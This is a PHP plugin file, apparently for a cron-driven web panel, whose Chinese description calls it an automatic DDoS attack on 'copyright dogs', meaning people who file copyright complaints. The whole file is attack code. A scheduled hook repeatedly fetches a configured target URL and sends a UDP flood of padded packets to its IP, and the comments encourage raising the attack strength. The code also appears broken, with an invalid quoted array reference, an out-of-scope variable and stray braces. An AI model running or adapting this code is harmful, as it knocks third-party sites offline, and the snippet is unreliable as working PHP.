<?php if (!defined('SYSTEM_ROOT')) { die('Insufficient Permissions'); }  
/*
Plugin Name: 云打版权狗
Version: 1.1
Plugin URL: http://blog.superxzr.net
Description: 自动DDOS攻击版权狗
Author: alien
Author Email: 457418121@qq.com 
Author URL: http://blog.superxzr.net
For: ALL
*/
$ddos = option::pget('alien_ddos');

$ip = gethostbyname("$ddos['url']");
    
function attack() { 
    
    global $ip;
    
for($i=0;$i<2048;$i++){
        $out .= "X";
}      

 
for ($i=1; $i<=3; $i++){  //这里你们自己改,推荐不修改
	file_get_contents($ddos['url']);
}
  
    for($i=0;$i<2;$i++){  //这里是udp攻击~自己看情况改（威力强劲）

        
        $fp = fsockopen("udp://$ip", 80, $errno, $errstr, 5);
        if($fp){ 
                fwrite($fp, $out);
                fclose($fp);
        }
}
    
    
    	echo "DDOS Attack Successfully!!Good job!";
        echo "<br/>";
        echo "Attacking mode: UDP Flood ";
        echo "<br/>";
   
	}
		}
        

		
addAction('cron_3','attack');

?>